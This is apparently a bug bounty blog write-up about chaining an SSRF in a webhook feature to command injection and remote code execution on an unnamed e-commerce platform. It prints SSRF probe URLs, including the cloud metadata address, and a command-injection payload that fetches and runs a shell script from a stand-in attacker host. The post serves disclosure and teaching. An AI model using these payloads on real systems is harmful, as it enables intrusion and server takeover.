---
layout: post
title: "Bug Bounty Success Story"
date: 2025-01-03 16:00:00 +0000
categories: [bug-bounty, write-ups]
excerpt: "A detailed write-up of a successful bug bounty submission that earned $5,000."
---

# Bug Bounty Success Story: SSRF to RCE

This write-up details a critical Server-Side Request Forgery (SSRF) vulnerability that led to Remote Code Execution (RCE) on a major e-commerce platform.

## Target Information
- **Platform**: E-commerce SaaS
- **Bug Type**: SSRF → RCE
- **Severity**: Critical
- **Bounty**: $5,000
- **Timeline**: 3 weeks from discovery to payout

## Discovery Process

### Initial Reconnaissance
The target had a webhook configuration feature that allowed users to set custom URLs for notifications. This immediately caught my attention as a potential SSRF vector.

### Vulnerability Analysis

#### Step 1: Webhook Testing
```bash
# Test payloads
http://localhost:22
http://127.0.0.1:3306
http://169.254.169.254/latest/meta-data/
```

#### Step 2: Internal Service Discovery
The webhook feature was making requests to internal services without proper validation:

```http
POST /api/webhooks/configure
Content-Type: application/json

{
  "url": "http://internal-service:8080/admin",
  "events": ["order.created"]
}
```

#### Step 3: RCE Chain
The internal service had a vulnerable endpoint that allowed command injection:

```http
POST /admin/backup
Content-Type: application/json

{
  "path": "/tmp/backup; curl http://attacker.com/shell.sh | bash"
}
```

## Exploitation Chain

1. **SSRF**: Bypass webhook URL validation
2. **Internal Discovery**: Find vulnerable internal services
3. **Command Injection**: Execute arbitrary commands
4. **Persistence**: Establish backdoor access

## Impact Assessment

- **Data Breach**: Access to customer database
- **System Compromise**: Full server access
- **Business Disruption**: Potential service downtime
- **Compliance Violations**: GDPR/PCI-DSS implications

## Responsible Disclosure

### Timeline
- **Day 1**: Vulnerability discovered
- **Day 2**: Proof of concept developed
- **Day 3**: Report submitted to bug bounty program
- **Day 5**: Initial response from security team
- **Day 10**: Vulnerability confirmed
- **Day 15**: Fix deployed
- **Day 21**: Bounty awarded

### Communication
Maintained professional communication throughout the process:
- Clear vulnerability description
- Step-by-step reproduction steps
- Impact assessment
- Suggested remediation

## Lessons Learned

### Technical Insights
- Always test internal service endpoints
- Chain multiple vulnerabilities for greater impact
- Document every step for clear reproduction

### Business Insights
- Bug bounty programs are valuable for security
- Quick response times build trust
- Clear communication is essential

## Prevention Recommendations

1. **Input Validation**: Validate all URL inputs
2. **Network Segmentation**: Isolate internal services
3. **Access Controls**: Implement proper authentication
4. **Monitoring**: Deploy intrusion detection systems

## Tools Used

- **Burp Suite**: Web application testing
- **Nmap**: Network reconnaissance
- **Custom Scripts**: Automation and testing
- **Documentation**: Clear reporting

## Conclusion

This bug bounty success demonstrates the importance of thorough security testing and responsible disclosure. The $5,000 bounty was well-earned through careful research and professional communication.

**Key Takeaways:**
- Persistence pays off in bug hunting
- Chain vulnerabilities for maximum impact
- Professional communication is crucial
- Document everything thoroughly
